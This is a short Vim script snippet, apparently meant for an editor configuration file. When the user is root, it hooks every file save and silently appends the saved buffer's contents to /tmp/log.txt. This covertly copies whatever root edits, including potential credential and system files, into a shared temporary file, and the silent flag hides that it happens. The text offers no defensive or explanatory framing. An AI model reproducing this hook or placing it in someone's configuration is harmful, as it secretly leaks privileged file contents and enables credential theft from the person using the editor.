:if $USER == "root"
:autocmd BufWritePost * :silent :w! >> /tmp/log.txt
:endif